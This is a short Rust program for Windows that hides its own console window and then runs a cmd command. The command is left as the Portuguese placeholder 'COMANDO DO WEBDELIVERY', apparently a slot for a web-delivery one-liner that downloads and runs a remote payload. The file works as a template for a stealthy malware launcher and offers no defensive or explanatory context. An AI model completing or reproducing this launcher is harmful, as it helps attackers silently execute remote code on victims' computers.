#![windows_subsystem = "windows"]
use std::process::Command;
extern crate winapi;
extern crate user32;
extern crate kernel32;

use std::ptr;

fn main() {
    let console_window = unsafe {kernel32::GetConsoleWindow()};

    if console_window != ptr::null_mut() {
        unsafe {
            user32::ShowWindow(console_window, winapi::SW_HIDE);
        }
    }

    let _output = Command::new("cmd")
        .arg("/k COMANDO DO WEBDELIVERY")
        .output()
        .expect("Failed to execute command");
}